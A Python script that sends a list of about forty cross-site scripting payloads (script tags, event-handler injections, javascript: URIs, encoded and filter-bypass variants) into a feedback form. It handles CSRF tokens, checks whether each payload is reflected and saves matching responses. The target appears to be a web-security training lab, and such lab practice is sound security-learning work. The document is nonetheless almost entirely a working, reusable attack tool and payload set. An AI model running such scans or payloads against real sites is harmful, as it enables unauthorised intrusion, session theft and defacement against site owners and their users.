#!/usr/bin/env python3
import requests
import sys
from urllib.parse import quote

# Target URL
BASE_URL = "https://0a3900c304b67111838b512800a90077.web-security-academy.net"
FEEDBACK_URL = f"{BASE_URL}/feedback"
SUBMIT_URL = f"{BASE_URL}/feedback/submit"

# XSS payloads to test
XSS_PAYLOADS = [
    # Basic script tags
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '<script>alert(document.cookie)</script>',
    '<script>alert(document.domain)</script>',
    
    # Event handlers
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror="alert(\'XSS\')">',
    '<body onload=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    
    # Alternative script injections
    '<ScRiPt>alert(1)</ScRiPt>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    
    # HTML injection with JavaScript
    '<h1 onclick="alert(1)">Click me</h1>',
    '<a href="javascript:alert(1)">Click</a>',
    '<button onclick="alert(1)">Click</button>',
    
    # Data URIs
    '<img src="data:text/html,<script>alert(1)</script>">',
    '<object data="data:text/html,<script>alert(1)</script>">',
    
    # Encoded variations
    '<script>alert(1)<%2fscript>',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    
    # Bypass attempts
    '<script>alert`1`</script>',
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<script>Function("alert(1)")()</script>',
    
    # Event handler variations
    '<img src=1 onerror=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<video><source onerror="alert(1)">',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    
    # Mixed case and encoding
    '<sCRipT>alert(1)</sCRipT>',
    '<script>\\u0061lert(1)</script>',
    '<script>\\x61lert(1)</script>',
    
    # Payload with closing tags
    '</textarea><script>alert(1)</script>',
    '</title><script>alert(1)</script>',
    '</style><script>alert(1)</script>',
    '</script><script>alert(1)</script>',
    
    # Using different quotes
    "<script>alert('XSS')</script>",
    '<script>alert("XSS")</script>',
    "<script>alert(`XSS`)</script>",
]

def test_xss_payload(session, payload, field_name="name"):
    """Test a single XSS payload in the feedback form"""
    
    # Get the feedback page first to get any required tokens
    response = session.get(FEEDBACK_URL)
    
    # Check if there's a CSRF token
    csrf_token = None
    if 'csrf' in response.text:
        # Try to extract CSRF token if present
        import re
        csrf_match = re.search(r'name=["\']csrf["\'].*?value=["\']([^"\']+)["\']', response.text)
        if csrf_match:
            csrf_token = csrf_match.group(1)
    
    # Prepare form data
    form_data = {
        field_name: payload,
        'email': 'test@test.com',
        'subject': 'Test Subject',
        'message': 'Test message'
    }
    
    if csrf_token:
        form_data['csrf'] = csrf_token
    
    # Submit the feedback form
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': BASE_URL,
        'Referer': FEEDBACK_URL
    }
    
    response = session.post(SUBMIT_URL, data=form_data, headers=headers, allow_redirects=True)
    
    return response

def check_xss_reflection(response_text, payload):
    """Check if the payload is reflected in the response"""
    # Check for exact reflection
    if payload in response_text:
        return "REFLECTED_EXACT"
    
    # Check for partial reflection (without encoding)
    if payload.replace('<', '').replace('>', '') in response_text:
        return "REFLECTED_PARTIAL"
    
    # Check for encoded reflection
    import html
    if html.escape(payload) in response_text:
        return "REFLECTED_ENCODED"
    
    # Check if alert or script appears anywhere
    if 'alert' in payload and 'alert' in response_text:
        return "PARTIAL_ALERT"
    
    return None

def main():
    print(f"[*] Testing XSS on feedback form at {FEEDBACK_URL}")
    print(f"[*] Testing {len(XSS_PAYLOADS)} payloads\\n")
    
    session = requests.Session()
    
    successful_payloads = []
    
    for i, payload in enumerate(XSS_PAYLOADS, 1):
        print(f"[{i}/{len(XSS_PAYLOADS)}] Testing: {payload[:50]}...")
        
        try:
            response = test_xss_payload(session, payload)
            
            # Check if payload is reflected
            reflection = check_xss_reflection(response.text, payload)
            
            if reflection:
                print(f"    ✓ {reflection}")
                if reflection == "REFLECTED_EXACT":
                    successful_payloads.append(payload)
                    print(f"    🎯 POTENTIAL XSS FOUND!")
                    
                    # Save the response for analysis
                    with open(f'xss_response_{i}.html', 'w') as f:
                        f.write(response.text)
                    print(f"    → Response saved to xss_response_{i}.html")
            else:
                print(f"    ✗ Not reflected")
                
        except Exception as e:
            print(f"    ✗ Error: {e}")
    
    print(f"\\n[*] Testing complete!")
    print(f"[*] Found {len(successful_payloads)} potentially successful payloads:")
    for payload in successful_payloads:
        print(f"    - {payload}")
    
    # Test other fields too
    print("\\n[*] Testing other form fields...")
    test_fields = ['email', 'subject', 'message']
    
    for field in test_fields:
        print(f"\\n[*] Testing field: {field}")
        simple_payload = '<script>alert(1)</script>'
        
        try:
            response = test_xss_payload(session, simple_payload, field_name=field)
            reflection = check_xss_reflection(response.text, simple_payload)
            
            if reflection:
                print(f"    ✓ Field '{field}' reflects input: {reflection}")
                if reflection == "REFLECTED_EXACT":
                    print(f"    🎯 POTENTIAL XSS in '{field}' field!")
            else:
                print(f"    ✗ Field '{field}' does not reflect input")
                
        except Exception as e:
            print(f"    ✗ Error testing '{field}': {e}")

if __name__ == "__main__":
    main()